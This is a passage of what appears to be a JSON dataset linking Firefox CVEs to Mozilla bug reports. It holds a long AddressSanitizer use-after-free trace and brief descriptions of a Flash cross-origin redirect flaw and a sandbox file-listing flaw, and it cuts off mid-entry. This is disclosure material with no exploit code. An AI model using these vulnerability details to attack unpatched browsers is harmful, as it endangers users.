/builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:468 #8 0x7fcb85c36fa5 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:12 #9 0x7fcb85c36fa5 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3086 #10 0x7fcb85c1d4c6 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:418:12 #11 0x7fcb85c4bed5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:490:15 #12 0x7fcb85c4d152 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:536:10 #13 0x7fcb86794a5a in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2981:12 #14 0x7fcb7eb2ed05 in mozilla::dom::EventListener::HandleEvent(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventListenerBinding.cpp:51:8 #15 0x7fcb7faaa64e in HandleEvent<mozilla::dom::EventTarget *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventListenerBinding.h:66:12 #16 0x7fcb7faaa64e in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1121 #17 0x7fcb7faabddb in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1291:20 #18 0x7fcb7fa960e7 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:528:16 #19 0x7fcb7fa99ee3 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:961:9 #20 0x7fcb7cab1cc2 in nsContentUtils::MaybeFireNodeRemoved(nsINode*, nsINode*) /builds/worker/workspace/build/src/dom/base/nsContentUtils.cpp:4776:5 #21 0x7fcb7cf5bc71 in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1926:7 #22 0x7fcb7cf5ac5f in InsertBefore /builds/worker/workspace/build/src/dom/base/nsINode.h:1847:12 #23 0x7fcb7cf5ac5f in AppendChild /builds/worker/workspace/build/src/dom/base/nsINode.h:1851 #24 0x7fcb7cf5ac5f in nsINode::Append(mozilla::dom::Sequence<mozilla::dom::OwningNodeOrString> const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1643 #25 0x7fcb7ec79dd6 in mozilla::dom::ElementBinding::append(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Element*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/ElementBinding.cpp:5175:9 #26 0x7fcb7f381b81 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3280:13 #27 0x7fcb85c4c157 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:280:15 #28 0x7fcb85c4c157 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:468 #29 0x7fcb85c36fa5 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:12 #30 0x7fcb85c36fa5 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3086 #31 0x7fcb85c1d4c6 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:418:12 #32 0x7fcb85c4bed5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:490:15 #33 0x7fcb85c4d152 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:536:10 #34 0x7fcb86794a5a in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2981:12 #35 0x7fcb7eb298be in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:264:37 #36 0x7fcb7fae611a in void mozilla::dom::EventHandlerNonNull::Call<nsISupports*>(nsISupports* const&, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&, char const*, mozilla::dom::CallbackObject::ExceptionHandling, JSCompartment*) /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:363:12 #37 0x7fcb7fae3a84 in mozilla::JSEventHandler::HandleEvent(mozilla::dom::Event*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214:12 #38 0x7fcb7faaa69d in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1124:52 #39 0x7fcb7faabddb in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1291:20 #40 0x7fcb7fa960e7 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:528:16 #41 0x7fcb7fa99ee3 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:961:9 #42 0x7fcb81da5378 in nsDocumentViewer::LoadComplete(nsresult) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1166:7 #43 0x7fcb84f06cc2 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7169:21 #44 0x7fcb84f030e9 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6962:7 #45 0x7fcb84f0a8ef in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp #46 0x7fcb7bacbb97 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1309:3 #47 0x7fcb7bacac1a in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:852:14 #48 0x7fcb7bac77f8 in nsDocLoader::DocLoaderIsEmpty(bool) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:741:9 #49 0x7fcb7bac97bc in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:627:5 #50 0x7fcb7baca7dc in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp #51 0x7fcb79e825fa in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:629:28 #52 0x7fcb7ceaa74a in DoUnblockOnload /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:8340:18 #53 0x7fcb7ceaa74a in nsDocument::UnblockOnload(bool) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:8262 #54 0x7fcb7ce8afd4 in nsIDocument::DispatchContentLoadedEvents() /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:5224:3 #55 0x7fcb7cf9d314 in applyImpl<nsIDocument, void (nsIDocument::*)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1165:12 #56 0x7fcb7cf9d314 in apply<nsIDocument, void (nsIDocument::*)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1171 #57 0x7fcb7cf9d314 in mozilla::detail::RunnableMethodImpl<nsIDocument*, void (nsIDocument::*)(), true, (mozilla::RunnableKind)0>::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1216 #58 0x7fcb79c77821 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:337:32 #59 0x7fcb79c96146 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1090:14 #60 0x7fcb79cb2080 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:519:10 #61 0x7fcb7ab9364a in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #62 0x7fcb7aae6cf9 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #63 0x7fcb7aae6cf9 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #64 0x7fcb7aae6cf9 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #65 0x7fcb8170643a in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:157:27 #66 0x7fcb859637bb in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:893:22 #67 0x7fcb7aae6cf9 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #68 0x7fcb7aae6cf9 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #69 0x7fcb7aae6cf9 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #70 0x7fcb85963180 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:719:34 #71 0x4f50dc in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:50:30 #72 0x4f50dc in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:282 #73 0x7fcb999cc82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #74 0x42476c in _start (/fuzzer3/firefox/firefox+0x42476c) 0x61d0002671c8 is located 328 bytes inside of 1968-byte region [0x61d000267080,0x61d000267830) freed by thread T0 (file:// Content) here: #0 0x4c5172 in __interceptor_free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:68:3 #1 0x7fcb79b1d730 in SnowWhiteKiller::~SnowWhiteKiller() /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2729:25 #2 0x7fcb79b25b1f in FreeSnowWhite /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2917:3 #3 0x7fcb79b25b1f in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3925 #4 0x7fcb79b24fad in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3746:9 #5 0x7fcb79b28ec2 in nsCycleCollector_collect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4315:21 #6 0x7fcb7cf725de in nsJSContext::CycleCollectNow(nsICycleCollectorListener*) /builds/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1488:3 #7 0x7fcb7eda41da in mozilla::dom::FuzzingFunctionsBinding::cycleCollect(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/FuzzingFunctionsBinding.cpp:54:3 #8 0x7fcb85c4c157 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:280:15 #9 0x7fcb85c4c157 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:468 #10 0x7fcb85c36fa5 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:12 #11 0x7fcb85c36fa5 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3086 #12 0x7fcb85c1d4c6 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:418:12 #13 0x7fcb85c4bed5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:490:15 #14 0x7fcb85c4d152 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:536:10 #15 0x7fcb86794a5a in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2981:12 #16 0x7fcb7eb2ed05 in mozilla::dom::EventListener::HandleEvent(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventListenerBinding.cpp:51:8 #17 0x7fcb7faaa64e in HandleEvent<mozilla::dom::EventTarget *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventListenerBinding.h:66:12 #18 0x7fcb7faaa64e in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1121 #19 0x7fcb7faabddb in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1291:20 #20 0x7fcb7fa960e7 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:528:16 #21 0x7fcb7fa99ee3 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:961:9 #22 0x7fcb7cab1cc2 in nsContentUtils::MaybeFireNodeRemoved(nsINode*, nsINode*) /builds/worker/workspace/build/src/dom/base/nsContentUtils.cpp:4776:5 #23 0x7fcb7cf5bc71 in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1926:7 #24 0x7fcb7cf59adc in InsertBefore /builds/worker/workspace/build/src/dom/base/nsINode.h:1847:12 #25 0x7fcb7cf59adc in AppendChild /builds/worker/workspace/build/src/dom/base/nsINode.h:1851 #26 0x7fcb7cf59adc in ConvertNodesOrStringsIntoNode(mozilla::dom::Sequence<mozilla::dom::OwningNodeOrString> const&, nsIDocument*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1454 #27 0x7fcb7cf5ac33 in nsINode::Append(mozilla::dom::Sequence<mozilla::dom::OwningNodeOrString> const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1638:5 #28 0x7fcb7ec79dd6 in mozilla::dom::ElementBinding::append(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Element*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/ElementBinding.cpp:5175:9 #29 0x7fcb7f381b81 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3280:13 #30 0x7fcb85c4c157 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:280:15 #31 0x7fcb85c4c157 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:468 #32 0x7fcb85c36fa5 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:12 #33 0x7fcb85c36fa5 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3086 #34 0x7fcb85c1d4c6 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:418:12 #35 0x7fcb85c4bed5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:490:15 #36 0x7fcb85c4d152 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:536:10 #37 0x7fcb86794a5a in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2981:12 previously allocated by thread T0 (file:// Content) here: #0 0x4c54b3 in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:88:3 #1 0x4f5f7d in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:70:17 #2 0x7fcb7fe7e170 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:156:12 #3 0x7fcb7fe7e170 in NS_NewHTMLDocument(nsIDocument**, bool) /builds/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:156 #4 0x7fcb811ea681 in NS_NewDOMDocument(nsIDocument**, nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, mozilla::dom::DocumentType*, nsIURI*, nsIURI*, nsIPrincipal*, bool, nsIGlobalObject*, DocumentFlavor) /builds/worker/workspace/build/src/dom/xml/XMLDocument.cpp:86:10 #5 0x7fcb7cc74d09 in mozilla::dom::DOMParser::SetUpDocument(DocumentFlavor, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/DOMParser.cpp:312:17 #6 0x7fcb7cc747f6 in mozilla::dom::DOMParser::ParseFromString(nsTSubstring<char16_t> const&, mozilla::dom::SupportedType, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/DOMParser.cpp:68:38 #7 0x7fcb7eab0708 in mozilla::dom::DOMParserBinding::parseFromString(JSContext*, JS::Handle<JSObject*>, mozilla::dom::DOMParser*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/DOMParserBinding.cpp:79:49 #8 0x7fcb7f381b81 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3280:13 #9 0x7fcb85c4c157 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:280:15 #10 0x7fcb85c4c157 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:468 #11 0x7fcb85c36fa5 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:12 #12 0x7fcb85c36fa5 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3086 #13 0x7fcb85c1d4c6 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:418:12 #14 0x7fcb85c4bed5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:490:15 #15 0x7fcb85c4d152 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:536:10 #16 0x7fcb86794a5a in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2981:12 #17 0x7fcb7eb298be in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:264:37 #18 0x7fcb7fae611a in void mozilla::dom::EventHandlerNonNull::Call<nsISupports*>(nsISupports* const&, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&, char const*, mozilla::dom::CallbackObject::ExceptionHandling, JSCompartment*) /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:363:12 #19 0x7fcb7fae3a84 in mozilla::JSEventHandler::HandleEvent(mozilla::dom::Event*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214:12 #20 0x7fcb7faaa69d in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1124:52 #21 0x7fcb7faabddb in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1291:20 #22 0x7fcb7fa960e7 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:528:16 #23 0x7fcb7fa99ee3 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:961:9 #24 0x7fcb81da5378 in nsDocumentViewer::LoadComplete(nsresult) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1166:7 #25 0x7fcb84f06cc2 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7169:21 #26 0x7fcb84f030e9 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6962:7 #27 0x7fcb84f0a8ef in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp #28 0x7fcb7bacbb97 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1309:3 #29 0x7fcb7bacac1a in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:852:14 #30 0x7fcb7bac77f8 in nsDocLoader::DocLoaderIsEmpty(bool) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:741:9 #31 0x7fcb7bac97bc in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:627:5 #32 0x7fcb7baca7dc in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:5763:44 in CreateTextNode Shadow bytes around the buggy address: 0x0c3a80044de0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3a80044df0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3a80044e00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3a80044e10: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3a80044e20: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c3a80044e30: fd fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd 0x0c3a80044e40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3a80044e50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3a80044e60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3a80044e70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3a80044e80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==12349==ABORTING"
      }
    ],
    "CVE-2018-12364": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1436241",
        "title": "Firefox allows flash to follow 307 redirects to other origins with arbitrary content-types",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36 Steps to reproduce: Used https://github.com/sp1d3r/swf_json_csrf in latest available version of flash to send a post request cross-domain with a non-simple content type. Actual results: The request is sent in firefox. Expected results: The request should either not be sent or the content-type should not be allowed to be a non-simple content-type without a cors preflight request being made."
      }
    ],
    "CVE-2018-12365": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1459206",
        "title": "Arbitrary file listing (content disclosure?) by compromised content process",
        "description": "The GetFilesRequest IPC method on PContentParent appears to allow a compromised child to list arbitrary files: https://searchfox.org/mozilla-central/source/dom/ipc/ContentParent.cpp#5238 I haven't worked out whether this is just directory listings, or whether it can also get contents. The threat model for the sandbox should not allow a child process to access the filesystem without affirmative user consent (e.g. the UI shown by <input type=file>, drag-and-drop, etc.). I'm not super familiar with this code or how it's used, so I'd appreciate feeback."
      }
    ],
    "CVE-2018-12366": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1464039",
        "title": "Heap-buffer-overflow READ 4 · qcms_transform_module_clut_only",
